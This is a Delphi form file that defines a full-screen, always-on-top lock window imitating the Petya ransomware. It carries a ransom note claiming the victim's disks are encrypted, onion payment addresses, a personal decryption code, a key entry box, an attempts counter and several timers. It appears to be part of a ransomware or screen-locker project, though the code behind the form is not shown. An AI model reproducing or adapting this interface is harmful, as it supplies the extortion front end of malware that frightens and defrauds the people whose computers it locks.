object Form1: TForm1
  Left = 169
  Top = 157
  BorderIcons = []
  BorderStyle = bsNone
  Caption = 'petr'
  ClientHeight = 637
  ClientWidth = 1149
  Color = clBlack
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -11
  Font.Name = 'Tahoma'
  Font.Style = []
  FormStyle = fsStayOnTop
  OldCreateOrder = False
  Position = poDesktopCenter
  WindowState = wsMaximized
  OnCloseQuery = FormCloseQuery
  OnCreate = FormCreate
  OnResize = FormResize
  PixelsPerInch = 96
  TextHeight = 13
  object Label4: TLabel
    Left = 0
    Top = 0
    Width = 64
    Height = 16
    Caption = 'Username'
    Font.Charset = RUSSIAN_CHARSET
    Font.Color = clWhite
    Font.Height = -11
    Font.Name = 'Fixedsys'
    Font.Style = []
    ParentFont = False
  end
  object Label5: TLabel
    Left = 0
    Top = 621
    Width = 1149
    Height = 16
    Align = alBottom
    Alignment = taCenter
    Caption = '[Enter]'
    Font.Charset = RUSSIAN_CHARSET
    Font.Color = clWhite
    Font.Height = -13
    Font.Name = 'Fixedsys'
    Font.Style = []
    ParentFont = False
    OnClick = Label5Click
  end
  object Label6: TLabel
    Left = 0
    Top = 0
    Width = 1149
    Height = 16
    Align = alTop
    Alignment = taRightJustify
    Caption = 'Attempts left: '
    Font.Charset = RUSSIAN_CHARSET
    Font.Color = clWhite
    Font.Height = -11
    Font.Name = 'Fixedsys'
    Font.Style = []
    ParentFont = False
    Transparent = True
  end
  object Panel1: TPanel
    Left = 0
    Top = 16
    Width = 1153
    Height = 601
    BevelOuter = bvNone
    Color = 191
    TabOrder = 0
    object Label1: TLabel
      Left = 8
      Top = 8
      Width = 379
      Height = 16
      Caption = 'You became victim of the PETYA RANSOMWARE!'
      Font.Charset = RUSSIAN_CHARSET
      Font.Color = clWhite
      Font.Height = -13
      Font.Name = 'Fixedsys'
      Font.Style = [fsBold]
      ParentFont = False
    end
    object Label2: TLabel
      Left = 8
      Top = 64
      Width = 608
      Height = 320
      Caption = 
        'The harddisks of your computer have been encrypted with an milit' +
        'ary grade'#13#10'encryption algorithm. There is no way to restore your' +
        ' data without a special'#13#10'key. You can purchase this key on the d' +
        'arknet page shown in step 2.'#13#10#13#10'To purchase your key and restore' +
        ' your data, please follow these three easy'#13#10'steps:'#13#10#13#10'1. Downloa' +
        'd the Tor Browser at "https://www.torproject.org/". If you need'#13 +
        #10'    help, please google for "access onion page".'#13#10'2. Visit one ' +
        'of the following pages with the Tor Browser:'#13#10#13#10'    http://petya' +
        '37h9lggpod1.onion/BakaWB'#13#10'    http://petya5km01aakfd7.onion/Baka' +
        'WB'#13#10#13#10'3. Enter your personal decryption code there:'#13#10#13#10'    tbRoU' +
        'v-Fs6ZyW-bEWEI7-AXlIsL-DFdTbY-z0RD0M-sZ3OVq-YViv5Q-J12yQD-jarpSS' +
        '-'#13#10'    SCNcQ9-cI9ULO-NCFJzk-YyuHyH-jKwrWW'#13#10#13#10'If you already purc' +
        'hased your key, please enter it below.'
      Font.Charset = RUSSIAN_CHARSET
      Font.Color = clWhite
      Font.Height = -13
      Font.Name = 'Fixedsys'
      Font.Style = []
      ParentFont = False
    end
    object Label3: TLabel
      Left = 8
      Top = 552
      Width = 32
      Height = 16
      Caption = 'Key:'
      Font.Charset = RUSSIAN_CHARSET
      Font.Color = clWhite
      Font.Height = -13
      Font.Name = 'Fixedsys'
      Font.Style = []
      ParentFont = False
    end
    object Panel2: TPanel
      Left = 0
      Top = 32
      Width = 1153
      Height = 9
      BevelOuter = bvNone
      Color = clWhite
      TabOrder = 0
    end
    object Edit1: TEdit
      Left = 48
      Top = 552
      Width = 593
      Height = 16
      AutoSize = False
      BevelInner = bvNone
      BorderStyle = bsNone
      Color = 191
      Font.Charset = RUSSIAN_CHARSET
      Font.Color = clWhite
      Font.Height = -13
      Font.Name = 'Fixedsys'
      Font.Style = []
      MaxLength = 60
      ParentFont = False
      TabOrder = 1
      OnKeyPress = Edit1KeyPress
    end
  end
  object ListBox1: TListBox
    Left = 952
    Top = 72
    Width = 81
    Height = 33
    ItemHeight = 13
    TabOrder = 1
    Visible = False
  end
  object Timer1: TTimer
    Interval = 100
    OnTimer = Timer1Timer
    Left = 992
    Top = 136
  end
  object Timer2: TTimer
    Interval = 1
    OnTimer = Timer2Timer
    Left = 1048
    Top = 152
  end
  object Timer3: TTimer
    OnTimer = Timer3Timer
    Left = 984
    Top = 200
  end
  object Timer4: TTimer
    Interval = 200
    OnTimer = Timer4Timer
    Left = 1040
    Top = 216
  end
end
